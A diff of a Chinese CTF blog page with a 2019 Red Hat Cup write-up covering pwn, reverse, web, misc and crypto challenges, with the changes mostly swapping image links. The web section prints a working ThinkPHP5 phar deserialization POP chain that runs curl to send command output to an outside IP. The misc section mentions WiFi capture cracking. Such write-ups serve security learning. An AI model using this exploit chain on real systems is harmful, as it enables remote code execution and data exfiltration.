@@ -89,28 +89,27 @@
 <meta property="og:site_name" content="R4bb1t的ctf博客">
 <meta property="og:description" content="pwnthree静态编译文件，开了NX，">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://uploader.shimo.im/f/Xl9EZL6Ep4A5a2E8.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/lzW3ju28MRUToXSY.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/qhcNfC3d6l4yWGmt.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/VJLwhzq7dAA5eN9X.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/e5vxY35InNsDJiKi.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/8rcdps3oS0MAXXmN.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/5hnGQYNmgpsd7lPL.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/MBcx64UxB6QrQ9ug.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/1S1KCzSicDcStKev.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/ZApAuUHcna4kwEJc.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/rAXe9BoVb78V6S1O.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/6zoKnXHPk4UCf21n.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/5DECdiecploWkR7z.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/vKGsOpOErRMZIrc9.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/nCE1zSAAkDgtGiD1.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/K7BpqME6Ms0ij1NR.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/ydZeBPTWRMsFVGvN.png!thumbnail">
-<meta property="og:updated_time" content="2019-11-12T02:22:10.218Z">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/1.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/2.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/3.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/4.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/5.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/6.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/7.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/8.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/9.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/10.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/11.jpg">
+<meta property="og:image" content="http://yoursite.com/2019redhat/12.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/13.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/14.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/15.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2019redhat/16.jpg">
+<meta property="og:updated_time" content="2019-11-14T13:39:28.108Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2019红帽杯wp">
 <meta name="twitter:description" content="pwnthree静态编译文件，开了NX，">
-<meta name="twitter:image" content="https://uploader.shimo.im/f/Xl9EZL6Ep4A5a2E8.png!thumbnail">
+<meta name="twitter:image" content="http://yoursite.com/images/2019redhat/1.jpg">
 
 
 
@@ -404,7 +403,7 @@
 
       
         <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="three"><a href="#three" class="headerlink" title="three"></a>three</h2><p>静态编译文件，开了NX，</p>
-<p><img src="https://uploader.shimo.im/f/Xl9EZL6Ep4A5a2E8.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\1.jpg" alt="图片"></p>
 <a id="more"></a>
 <p>有一个3字节的shellcode可以操作；</p>
 <p>在<code>Tell me</code>的时候写入ropchain，再执行shellcode跳转到0x80f6cc0执行ropchain</p>
@@ -416,7 +415,7 @@
 </code></pre><h2 id="easyRE"><a href="#easyRE" class="headerlink" title="easyRE"></a>easyRE</h2><p>通过字符定位到主逻辑，两次解密可以得到 Info:The first four chars are <code>flag</code> 和 <a href="https://bbs.pediy.com/thread-254172.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254172.htm</a>，这是个关于主动防御的看雪文章，然而并没有发现flag，emmmm主动防御，其实是在误导我们；真正的flag在sub_400D35位置，结合info得到key后，简单的亦或解密出来即可</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45,0x5B]</span><br><span class="line">key = [38,89,65,49]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for j in range(len(data)):</span><br><span class="line">  flag += chr(data[j] ^ key[j % 4])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
 <h2 id="childRE"><a href="#childRE" class="headerlink" title="childRE"></a>childRE</h2><p>UnDecorateSymbolName 是c++的去函数修饰的函数，写个脚本自己测试可以得到31函数名为?My_Aut0_PWN@ROPxx@@AAEPADPAE@Z，</p>
-<p><img src="https://uploader.shimo.im/f/lzW3ju28MRUToXSY.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\2.jpg" alt="图片"></p>
 <p>但是前面还有一个调换了顺序，改回来后可以得到正确的输入Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP，md5一下</p>
 <p>flag:flag{63b148e750fed3a33419168ac58083f5}</p>
 <h2 id="cacl"><a href="#cacl" class="headerlink" title="cacl"></a>cacl</h2><p>认真分析可以发现程序实现了自己的一套大整数运算，有加、减、乘、除和次方；最后结果为0即能得到flag</p>
@@ -425,46 +424,45 @@
 <p>b = (x3 + 4)^3 - 12<em>x3^2 - 48</em>x3-22</p>
 <p>化简一下得到：a = x1^3 + x2^3 , b = x3^3 + 42</p>
 <p>最后程序判断结果： a == b，<a href="https://xw.qq.com/cmsid/20190906A0NZO5" target="_blank" rel="noopener">https://xw.qq.com/cmsid/20190906A0NZO5</a></p>
-<p><img src="https://uploader.shimo.im/f/qhcNfC3d6l4yWGmt.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\3.jpg" alt="图片"></p>
 <p>得到flag: 951e27be2b2f10b7fa22a6dc8f4682bd</p>
 <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ticket-system"><a href="#ticket-system" class="headerlink" title="ticket_system"></a>ticket_system</h2><p>利用postXML去读源文件</p>
-<p><img src="https://uploader.shimo.im/f/VJLwhzq7dAA5eN9X.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\4.jpg" alt="图片"></p>
 <p>把源文件和readflag文件读下来以后可以分析出，攻击过程是上传一个可执行的php，通过thinkphp5的pop链和phar去触发反序列化漏洞</p>
 <p>readflag文件和*ctf的一模一样，直接拿当初的脚本就行了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">    0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),</span><br><span class="line">    1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),</span><br><span class="line">    2 =&gt; array(&quot;file&quot;, &quot;/tmp/error-output.txt&quot;, &quot;a&quot;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$process = proc_open(&apos;/readflag&apos;, $descriptorspec, $pipes, $cwd, $env);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (is_resource($process)) &#123;</span><br><span class="line">    $question = fread($pipes[1],1024);</span><br><span class="line">    $question = fread($pipes[1],1024);</span><br><span class="line">    $question = trim($question);</span><br><span class="line">    echo $question;</span><br><span class="line">    eval(&apos;$result = &apos;.$question.&apos;;&apos;);</span><br><span class="line">    fwrite($pipes[0], $result);</span><br><span class="line">    fclose($pipes[0]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $flag = fread($pipes[1],1024);</span><br><span class="line">    $flag = fread($pipes[1],1024);</span><br><span class="line">    $flag = fread($pipes[1],1024);</span><br><span class="line">    echo $flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fclose($pipes[1]);</span><br><span class="line">    </span><br><span class="line">    $return_value = proc_close($process);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    echo $return_value;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>上传过去以后拿微笑师傅的pop链打过去，本地监听就行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">    class Windows</span><br><span class="line">    &#123;</span><br><span class="line">        private $files;</span><br><span class="line">        public function __construct($files)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files = array($files);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\model\concern &#123;</span><br><span class="line">    trait Conversion</span><br><span class="line">    &#123;</span><br><span class="line">        protected $append = array(&quot;Smi1e&quot; =&gt; &quot;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    trait Attribute</span><br><span class="line">    &#123;</span><br><span class="line">        private $data;</span><br><span class="line">        private $withAttr = array(&quot;Smi1e&quot; =&gt; &quot;system&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public function get($system)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;data = array(&quot;Smi1e&quot; =&gt; &quot;$system&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think &#123;</span><br><span class="line">    abstract class Model</span><br><span class="line">    &#123;</span><br><span class="line">        use model\concern\Attribute;</span><br><span class="line">        use model\concern\Conversion;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    use think\Model;</span><br><span class="line">    class Pivot extends Model</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($system)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;get($system);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $Conver = new think\model\Pivot(&quot;curl http://134.175.34.73:2334/ -d `php /tmp/uploads/0cc175b9c0f1b6a831c399e269772661/20191111/6582f47189690b9acfc01cc069af8ea8.xml|tac|tr -d \&quot;\\n\&quot;|sed &apos;s/ //g&apos;`;&quot;);</span><br><span class="line">    $payload = new think\process\pipes\Windows($Conver);</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $phar-&gt;setMetadata($payload); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">    echo urlencode(serialize($payload));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://uploader.shimo.im/f/e5vxY35InNsDJiKi.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\5.jpg" alt="图片"></p>
 <h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>填个问卷就能拿到flag了</p>
 <h2 id="Advertising-for-Marriage"><a href="#Advertising-for-Marriage" class="headerlink" title="Advertising for Marriage"></a>Advertising for Marriage</h2><p>看内存看到有张vegetable.png</p>
-<p><img src="https://uploader.shimo.im/f/8rcdps3oS0MAXXmN.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\6.jpg" alt="图片"></p>
 <p>这个图片高度是错误的，在linux里面打不开，通过CRC码爆破出高度是D3</p>
-<p><img src="https://uploader.shimo.im/f/5hnGQYNmgpsd7lPL.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\7.jpg" alt="图片"></p>
 <p>然后再看进程，有个画图进程，把它dump下来</p>
-<p><img src="https://uploader.shimo.im/f/MBcx64UxB6QrQ9ug.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\8.jpg" alt="图片"></p>
 <p>dump下来用gimp打开看到是</p>
-<p><img src="https://uploader.shimo.im/f/1S1KCzSicDcStKev.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\9.jpg" alt="图片"></p>
 <p>这里建议把图片镜像一下</p>
 <p>再结合前面的hint</p>
-<p><img src="https://uploader.shimo.im/f/ZApAuUHcna4kwEJc.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\10.jpg" alt="图片"></p>
 <p>然后就能lsb恢复出加密的数据</p>
-<p><img src="https://uploader.shimo.im/f/rAXe9BoVb78V6S1O.png!thumbnail" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/6zoKnXHPk4UCf21n.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\11.jpg" alt="图片"></p>
+<p><img src="\2019redhat\12.jpg" alt="图片"></p>
 <p>base64解密以后提示维吉尼亚，gnxtmwg7r1417psedbs62587h0，密钥：bcxneedmoneyandgirlfirend</p>
 <p>解密就能得到flag</p>
 <p>d7f1417bfafbf62587e0</p>
-<p><img src="https://uploader.shimo.im/f/5DECdiecploWkR7z.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\13.jpg" alt="图片"></p>
 <h2 id="恶臭的数据包"><a href="#恶臭的数据包" class="headerlink" title="恶臭的数据包"></a>恶臭的数据包</h2><p>拿到数据包发现全是wifi加密的流量，马上想到</p>
 <p>aircrack-ng  cacosmia.cap</p>
 <p>发现数据包网路名称是mamawoxiangwantiequan</p>
 <p>然后想到爆破八位的wifi密码提取原包，本来生成了个700多m的字典去爆，发现要10h就直接顺手先试试弱密码12345678，解出源包cacosmia-dec.cap</p>
-<p><img src="https://uploader.shimo.im/f/vKGsOpOErRMZIrc9.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\14.jpg" alt="图片"></p>
 <p>然后提取http协议传输的文件，binwalk最大那个发现一张图和一个加密压缩包，</p>
 <p>找到传压缩包的tcp流，发现cookie中JWT有hint，压缩包密码是ping的网址：</p>
-<p><img src="https://uploader.shimo.im/f/nCE1zSAAkDgtGiD1.png!thumbnail" alt="图片">过滤dns协议网址，一个个试，找到最后一个就是密码</p>
-<p><img src="https://uploader.shimo.im/f/K7BpqME6Ms0ij1NR.png!thumbnail" alt="图片"></p>
+<p><img src="\images\2019redhat\15.jpg" alt="图片">过滤dns协议网址，一个个试，找到最后一个就是密码</p>
+<p><img src="\images\2019redhat\16.jpg" alt="图片"></p>
 <p>解压出flag，flag{f14376d0-793e-4e20-9eab-af23f3fdc158}</p>
 <h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h3 id="boardcast"><a href="#boardcast" class="headerlink" title="boardcast"></a>boardcast</h3><p>出题人失误，源文件直接放了flag</p>
-<p><img src="https://uploader.shimo.im/f/ydZeBPTWRMsFVGvN.png!thumbnail" alt="图片"></p>
 
       
     </div>
@@ -582,7 +580,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -604,7 +602,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
